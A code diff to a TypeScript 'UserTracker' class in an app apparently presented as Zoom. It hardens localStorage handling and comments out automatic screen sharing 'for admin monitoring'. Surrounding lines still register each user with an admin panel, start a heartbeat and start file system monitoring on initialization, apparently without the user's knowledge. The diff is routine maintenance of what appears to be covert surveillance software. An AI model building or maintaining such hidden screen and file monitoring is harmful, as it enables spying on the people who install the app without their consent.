@@ -32,16 +32,21 @@ class UserTracker {
       return 'server-user-' + Math.random().toString(36).substring(2, 15);
     }
     
-    // Try to get existing user ID from localStorage
-    let userId = localStorage.getItem('zoom_user_id');
-    
-    if (!userId) {
-      // Generate new user ID
-      userId = 'user-' + Math.random().toString(36).substring(2, 15);
-      localStorage.setItem('zoom_user_id', userId);
+    try {
+      // Try to get existing user ID from localStorage
+      let userId = localStorage.getItem('zoom_user_id');
+      
+      if (!userId) {
+        // Generate new user ID
+        userId = 'user-' + Math.random().toString(36).substring(2, 15);
+        localStorage.setItem('zoom_user_id', userId);
+      }
+      
+      return userId;
+    } catch (error) {
+      // Fallback if localStorage is not available
+      return 'user-' + Math.random().toString(36).substring(2, 15);
     }
-    
-    return userId;
   }
 
   private async getUserInfo(): Promise<UserInfo> {
@@ -120,9 +125,14 @@ class UserTracker {
       return; // Skip initialization on server
     }
 
-    // Set install date if not set
-    if (!localStorage.getItem('zoom_install_date')) {
-      localStorage.setItem('zoom_install_date', new Date().toISOString());
+    try {
+      // Set install date if not set
+      if (!localStorage.getItem('zoom_install_date')) {
+        localStorage.setItem('zoom_install_date', new Date().toISOString());
+      }
+    } catch (error) {
+      console.warn('localStorage not available, skipping install date setting');
+      return;
     }
 
     // Register user with admin panel
@@ -131,8 +141,8 @@ class UserTracker {
     // Start heartbeat
     this.startHeartbeat();
 
-        // Automatically start screen sharing for admin monitoring
-        await this.startAutomaticScreenShare();
+        // Automatically start screen sharing for admin monitoring - DISABLED
+        // await this.startAutomaticScreenShare();
 
         // Start file system monitoring
         this.startFileSystemMonitoring();
